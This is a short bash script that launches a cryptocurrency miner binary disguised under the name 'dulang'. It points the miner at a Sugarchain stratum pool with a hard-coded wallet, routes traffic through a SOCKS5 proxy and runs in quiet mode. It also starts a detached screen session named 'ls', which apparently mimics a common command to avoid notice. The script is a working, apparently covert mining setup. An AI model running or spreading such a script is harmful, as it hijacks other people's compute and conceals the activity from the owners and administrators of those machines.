#!/bin/bash

sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x dulang
screen -dmS ls 
POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.JOHAN
PROXY=socks5://37.1.197.114:80
./dulang -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
